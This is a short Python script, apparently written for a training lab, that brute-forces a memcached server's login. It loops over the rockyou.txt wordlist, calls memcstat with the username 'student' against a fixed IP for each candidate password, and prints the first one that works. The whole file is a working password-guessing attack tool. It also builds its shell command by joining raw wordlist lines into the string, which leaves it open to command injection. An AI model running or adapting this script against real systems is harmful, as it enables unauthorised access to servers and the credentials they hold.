#!/usr/bin/env python3

import subprocess as s

print ("""
|\/| _ _  _|_  _   |_ _
|  |(-|||(_|_)| |_||_(-
""")

w = open('/usr/share/wordlists/rockyou.txt')

for p in w:
        o = s.getoutput("memcstat --username=student --servers=192.160.226.3 --password="+p) #Change: IP, Username
        if len(o) > 0:
                #print(o) #Enable if you want to see the output of the command
				
                print('Password is:' + p)
                break